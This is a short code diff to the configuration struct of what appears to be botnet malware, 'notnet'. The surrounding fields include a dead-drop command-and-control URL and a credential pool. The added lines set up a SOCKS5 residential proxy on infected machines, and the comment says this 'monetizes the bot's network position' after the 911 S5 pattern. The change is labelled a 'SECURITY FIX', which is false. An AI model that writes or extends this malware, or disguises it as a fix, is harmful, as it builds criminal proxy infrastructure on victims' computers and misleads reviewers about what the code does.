@@ -122,7 +122,21 @@ typedef struct {
      * (fail-closed). Empty dead_drop_url = disabled. */
     char dead_drop_url[512];
     uint32_t dead_drop_interval;   /* seconds between re-resolution */
-    
+
+    /* SECURITY FIX (#89): Residential SOCKS5 forward proxy. When
+     * proxy_enabled=1 AND proxy_token is set, the bot listens on
+     * proxy_port and forwards CONNECT requests (RFC 1928) to IPv4/domain
+     * destinations after RFC 1929 user/pass auth — the token is the
+     * password, possession of which grants egress through the bot's IP.
+     * This monetizes the bot's network position as a residential proxy
+     * (the 911 S5 / ZeroAccess-successor pattern). Empty proxy_token means
+     * the proxy refuses to start (fail-closed). Configured via
+     * proxy_enabled= / proxy_port= / proxy_token= in the config file or the
+     * NOTNET_PROXY_TOKEN environment variable. */
+    uint8_t proxy_enabled;
+    uint16_t proxy_port;
+    char proxy_token[64];
+
     /* Credentials */
     notnet_cred_t cred_pool[CRED_POOL_MAX];
     int cred_count;
